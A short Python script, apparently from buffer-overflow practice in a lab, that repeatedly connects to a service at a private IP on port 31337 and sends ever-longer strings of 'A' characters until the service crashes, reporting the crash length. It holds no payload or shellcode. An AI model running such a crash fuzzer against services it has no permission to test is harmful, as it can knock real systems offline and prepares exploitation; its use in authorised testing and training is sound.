#!/usr/bin/env python3
from pwn import *
import sys
import socket
import signal
def crtl_C(signal,frame ):
    print(" [!] Exting...")
    sys.exit(0)
signal.signal(signal.SIGINT, crtl_C)

ip = "192.168.98.24"
port = 31337
timeout=5
string="A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            print("Fuzzing with {} bytes".format(len(string)))
            s.sendall((string+"\r\n").encode('utf-8'))
            s.recv(1024)
            s.close()
    except Exception as e:
        print(e)
        print("Fuzzing crashed at {} bytes".format(len(string)))
        sys.exit(0)
    string += 10 * "A"
    time.sleep(1)